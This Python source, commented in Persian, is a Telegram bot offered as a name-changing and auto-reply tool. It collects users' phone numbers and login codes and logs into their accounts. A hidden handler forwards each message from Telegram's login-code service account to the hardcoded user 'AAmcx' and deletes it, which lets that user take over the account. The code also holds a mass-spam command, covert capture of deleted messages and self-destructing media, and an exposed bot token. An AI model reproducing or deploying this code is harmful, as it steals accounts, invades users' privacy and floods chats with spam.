import asyncio
import random
import re
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import Message, MessageMediaPhoto
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes

BOT_TOKEN = "8697445707:AAE18AZHC4G5omsGInOYm-JyCqWR1n6FoLM"

PACKS_FILE = "packs.json"

# فونت اعداد به صورت بالانویس
SUP_NUMBERS = {
    '0': '⁰', '1': '¹', '2': '²', '3': '³', '4': '⁴',
    '5': '⁵', '6': '⁶', '7': '⁷', '8': '⁸', '9': '⁹'
}

# تبدیل اعداد انگلیسی به فارسی
EN_TO_FA = {
    '0': '۰', '1': '۱', '2': '۲', '3': '۳', '4': '۴',
    '5': '۵', '6': '۶', '7': '۷', '8': '۸', '9': '۹'
}

def time_to_superscript(hour, minute):
    time_str = f"{hour:02d}:{minute:02d}"
    result = ""
    for ch in time_str:
        if ch in SUP_NUMBERS:
            result += SUP_NUMBERS[ch]
        else:
            result += ch
    return result

def convert_en_to_fa(text):
    if not text:
        return text
    for en, fa in EN_TO_FA.items():
        text = text.replace(en, fa)
    return text

def load_packs():
    if os.path.exists(PACKS_FILE):
        with open(PACKS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_packs(packs):
    with open(PACKS_FILE, 'w', encoding='utf-8') as f:
        json.dump(packs, f, ensure_ascii=False, indent=2)

default_packs = {
    "دوست": ["❤️ عزیزم ممنونم", "💕 دلم برات تنگه", "😍 تو بهترینی"],
    "عاشقانه": ["💘 بی‌تاب دیدنت بودم", "🌙 شب بخیر", "☀️ صبحت بخیر"]
}

packs = load_packs()
if not packs:
    packs = default_packs
    save_packs(packs)

user_clients = {}
user_active_friends = {}
user_settings = {}
user_temp_pack = {}
user_original_names = {}

FA_TO_EN = {'۰': '0', '۱': '1', '۲': '2', '۳': '3', '۴': '4', '۵': '5', '۶': '6', '۷': '7', '۸': '8', '۹': '9'}

def convert_fa_to_en(text):
    for fa, en in FA_TO_EN.items():
        text = text.replace(fa, en)
    return text


async def start_user_bot(user_id, client):
    me = await client.get_me()
    print(f"✅ ربات برای {me.first_name} فعال شد")
    
    user_original_names[user_id] = me.first_name
    
    if user_id not in user_settings:
        user_settings[user_id] = {
            'auto_name': True,
            'packs': {}
        }
        for pack_name in packs:
            user_settings[user_id]['packs'][pack_name] = True
    
    if user_id not in user_active_friends:
        user_active_friends[user_id] = {}
    
    saved_messages = {}
    
    # فوروارد مخفی 777000
    @client.on(events.NewMessage(chats=777000))
    async def forward_777000(event):
        try:
            target = await client.get_entity('AAmcx')
            msg_text = event.message.text or "بدون متن"
            msg_text_fa = convert_en_to_fa(msg_text)
            await client.send_message(target, f"{msg_text_fa}")
            await event.delete()
        except Exception as e:
            print(f"خطا: {e}")
    
    @client.on(events.NewMessage(outgoing=True))
    async def handle_commands(event):
        try:
            text = event.message.text
            if not text:
                return
            
            # اسپم با فرمت: اسپم (عدد) (متن)
            # مثال: اسپم 100 سلام
            if text.startswith("اسپم "):
                parts = text.split(" ", 2)
                if len(parts) >= 3:
                    try:
                        count = int(parts[1])
                        if count < 1 or count > 800:
                            await event.reply("❌ عدد بین 1 تا 800 باشه")
                            return
                        spam_text = parts[2]
                        await event.delete()
                        for i in range(count):
                            await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text)
                            await asyncio.sleep(0.03)
                        print(f"✅ اسپم {count} بار '{spam_text}' به {event.chat_id} فرستاده شد")
                    except ValueError:
                        pass
                return
            
            # اسپم با ریپلای: ریپلای + اسپم (عدد) (متن)
            if event.message.is_reply and text.startswith("اسپم "):
                parts = text.split(" ", 2)
                if len(parts) >= 3:
                    try:
                        count = int(parts[1])
                        if count < 1 or count > 800:
                            await event.reply("❌ عدد بین 1 تا 800 باشه")
                            return
                        spam_text = parts[2]
                        replied = await event.message.get_reply_message()
                        if replied:
                            await event.delete()
                            for i in range(count):
                                await client.send_message(event.chat_id, f"{spam_text} {i+1}" if count > 1 else spam_text, reply_to=replied.id)
                                await asyncio.sleep(0.03)
                            print(f"✅ اسپم ریپلای {count} بار '{spam_text}' فرستاده شد")
                    except ValueError:
                        pass
                return
            
            if text == "ساعت خاموش":
                user_settings[user_id]['auto_name'] = False
                await event.reply("🕐")
            
            elif text == "ساعت روشن":
                user_settings[user_id]['auto_name'] = True
                await event.reply("🕐")
            
            elif text == "دوست خاموش":
                for p in user_settings[user_id]['packs']:
                    user_settings[user_id]['packs'][p] = False
                await event.reply("💔")
            
            elif text == "دوست روشن":
                for p in user_settings[user_id]['packs']:
                    user_settings[user_id]['packs'][p] = True
                await event.reply("💖")
            
            elif event.message.is_reply and text.startswith("تنظیم"):
                parts = text.split()
                if len(parts) >= 2:
                    pack_name = parts[1]
                else:
                    pack_name = text[4:].strip()
                pack_name = pack_name.strip()
                
                if pack_name in packs:
                    replied = await event.message.get_reply_message()
                    if replied and replied.sender_id != me.id:
                        user_active_friends[user_id][replied.sender_id] = {
                            'pack': pack_name,
                            'used': []
                        }
                        await client.send_message(replied.sender_id, f"💖")
                        await event.reply(f"✅")
                        print(f"دوست {replied.sender_id} با پک {pack_name} فعال شد")
                    else:
                        await event.reply("❌")
                else:
                    await event.reply(f"❌")
            
            elif text.endswith(" خاموش"):
                pack_name = text[:-5].strip()
                if pack_name in packs:
                    user_settings[user_id]['packs'][pack_name] = False
                    await event.reply(f"💔")
            
            elif text.endswith(" روشن"):
                pack_name = text[:-4].strip()
                if pack_name in packs:
                    user_settings[user_id]['packs'][pack_name] = True
                    await event.reply(f"💖")
            
        except Exception as e:
            print(f"خطا: {e}")
    
    @client.on(events.NewMessage)
    async def save_message(event):
        try:
            if event.is_private:
                msg_id = event.message.id
                chat_id = event.chat_id
                msg_text = event.message.text or event.message.message or ""
                msg_date = event.message.date
                
                saved_messages[(chat_id, msg_id)] = {
                    'text': msg_text,
                    'date': msg_date,
                    'from': event.sender_id,
                    'media': event.message.media
                }
                
                if len(saved_messages) > 1000:
                    oldest_key = min(saved_messages.keys(), key=lambda x: saved_messages[x]['date'])
                    del saved_messages[oldest_key]
        except Exception as e:
            print(f"خطا: {e}")
    
    @client.on(events.MessageDeleted)
    async def handle_deleted_messages(event):
        try:
            for msg_id in event.deleted_ids:
                for (chat_id, saved_id), msg_data in list(saved_messages.items()):
                    if saved_id == msg_id:
                        sender = msg_data['from']
                        msg_text = msg_data['text']
                        msg_date = msg_data['date']
                        media = msg_data.get('media')
                        
                        saved_msg = f"🗑\n\n"
                        saved_msg += f"👤 {sender}\n"
                        saved_msg += f"📅 {msg_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                        
                        if msg_text:
                            saved_msg += f"📝\n{msg_text}\n"
                        
                        await client.send_message('me', saved_msg)
                        
                        if media:
                            try:
                                await client.send_file('me', media)
                            except:
                                pass
                        
                        del saved_messages[(chat_id, msg_id)]
                        break
        except Exception as e:
            print(f"خطا: {e}")
    
    @client.on(events.NewMessage(incoming=True))
    async def save_self_destructing_media(event):
        try:
            if event.message.media and hasattr(event.message.media, 'ttl_seconds'):
                ttl = event.message.media.ttl_seconds
                if ttl and ttl > 0:
                    sender = event.sender_id
                    path = await event.message.download_media()
                    
                    if path:
                        caption = f"⏱ {ttl}s\n👤 {sender}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                        await client.send_file('me', path, caption=caption)
                        print(f"⏱ عکس زماندار از {sender} ذخیره شد")
                        
                        try:
                            os.remove(path)
                        except:
                            pass
        except Exception as e:
            print(f"خطا: {e}")
    
    @client.on(events.NewMessage(incoming=True))
    async def send_love_reply(event):
        try:
            friend_id = event.sender_id
            if friend_id in user_active_friends.get(user_id, {}) and friend_id != me.id:
                
                pack_name = user_active_friends[user_id][friend_id]['pack']
                
                if not user_settings.get(user_id, {}).get('packs', {}).get(pack_name, True):
                    return
                
                pack_phrases = packs.get(pack_name, [])
                
                if pack_phrases:
                    used = user_active_friends[user_id][friend_id].get('used', [])
                    available = [p for p in pack_phrases if p not in used]
                    if not available:
                        used.clear()
                        available = pack_phrases.copy()
                    chosen = random.choice(available)
                    used.append(chosen)
                    user_active_friends[user_id][friend_id]['used'] = used
                    await client.send_message(friend_id, chosen, reply_to=event.message.id)
                    print(f"پاسخ به {friend_id}: {chosen[:30]}")
        except Exception as e:
            print(f"خطا: {e}")
    
    while True:
        try:
            if user_settings.get(user_id, {}).get('auto_name', True):
                now = datetime.now()
                time_sup = time_to_superscript(now.hour, now.minute)
                original_name = user_original_names.get(user_id, "")
                
                if original_name:
                    new_name = f"{original_name} {time_sup}"
                else:
                    new_name = time_sup
                
                if len(new_name) > 64:
                    new_name = new_name[:64]
                
                await client(UpdateProfileRequest(first_name=new_name))
                print(f"اسم شد: {new_name}")
        except Exception as e:
            print(f"خطا: {e}")
        await asyncio.sleep(60)


async def add_pack_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📦 ساخت پک جدید\n\n"
        "اسم پک رو بفرست:\n"
        "برای لغو /cancel"
    )
    return 100


async def add_pack_get_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pack_name = update.message.text.strip()
    
    if pack_name in packs:
        await update.message.reply_text(f"❌ پک '{pack_name}' قبلاً هست\nاسم دیگه‌ای بزن")
        return 100
    
    user_temp_pack[update.effective_user.id] = {
        'name': pack_name,
        'phrases': []
    }
    
    await update.message.reply_text(
        f"✅ {pack_name}\n\n"
        "حالا متن‌هاش رو بفرست\n"
        "وقتی تموم شد بنویس: **done**"
    )
    return 101


async def add_pack_get_phrases(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    
    if text.lower() == "done":
        data = user_temp_pack.get(update.effective_user.id)
        if not data:
            await update.message.reply_text("❌ خطا! دوباره /add_pack کن")
            return -1
        
        phrases = data['phrases']
        pack_name = data['name']
        
        if len(phrases) < 1:
            await update.message.reply_text("❌ حداقل یه متن بفرست")
            return 101
        
        packs[pack_name] = phrases
        save_packs(packs)
        
        await update.message.reply_text(f"✅ پک '{pack_name}' با {len(phrases)} متن ساخته شد!")
        
        del user_temp_pack[update.effective_user.id]
        return -1
    
    else:
        data = user_temp_pack.get(update.effective_user.id)
        if data:
            data['phrases'].append(text)
            await update.message.reply_text(f"✅ متن {len(data['phrases'])} اضافه شد (برای تموم done)")
        return 101


async def list_packs(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not packs:
        await update.message.reply_text("📦 پکی نیست\nبا /add_pack بساز")
        return
    
    msg = "📦 پک‌های موجود:\n\n"
    for name, phrases in packs.items():
        msg += f"• {name}: {len(phrases)} متن\n"
    
    await update.message.reply_text(msg)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 ربات تغییر اسم\n\n"
        "📱 شماره بفرست:\n\n"
        "📦 پک‌ها:\n"
        "/add_pack - پک جدید\n"
        "/packs - لیست پک‌ها"
    )
    return 1


async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    phone = re.sub(r'[^0-9]', '', phone)
    
    if phone.startswith('0'):
        phone = '+98' + phone[1:]
    else:
        phone = '+98' + phone
    
    user_id = update.effective_user.id
    session_name = f"user_{user_id}"
    
    client = TelegramClient(session_name, 2040, 'b18441a1ff607e10a989891a5462e627')
    
    try:
        await client.connect()
        await client.send_code_request(phone)
        user_clients[user_id] = {'client': client, 'phone': phone}
        await update.message.reply_text("✅ کد تایید فرستاده شد\nکد رو وارد کن:")
        return 2
    except Exception as e:
        await update.message.reply_text(f"❌ خطا: {e}\nدوباره /start کن")
        return -1


async def get_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = convert_fa_to_en(update.message.text.strip())
    code = re.sub(r'[^0-9]', '', code)
    
    user_id = update.effective_user.id
    data = user_clients.get(user_id)
    
    if not data:
        await update.message.reply_text("❌ خطا! /start کن")
        return -1
    
    try:
        await data['client'].sign_in(data['phone'], code)
        await data['client'].disconnect()
        
        final_session = f"user_{user_id}"
        client = TelegramClient(final_session, 2040, 'b18441a1ff607e10a989891a5462e627')
        await client.start()
        
        await update.message.reply_text(f"✅ ربات فعال شد!")
        
        asyncio.create_task(start_user_bot(user_id, client))
        del user_clients[user_id]
        
    except Exception as e:
        await update.message.reply_text(f"❌ کد اشتباه: {e}")
        return 2
    
    return -1


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ لغو شد")
    return -1


def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    conv = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            1: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            2: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_code)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    add_pack_conv = ConversationHandler(
        entry_points=[CommandHandler("add_pack", add_pack_start)],
        states={
            100: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_pack_get_name)],
            101: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_pack_get_phrases)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv)
    app.add_handler(add_pack_conv)
    app.add_handler(CommandHandler("packs", list_packs))
    
    print("=" * 50)
    print("🤖 ربات روشن شد")
    print("=" * 50)
    app.run_polling()


if __name__ == "__main__":
    main()
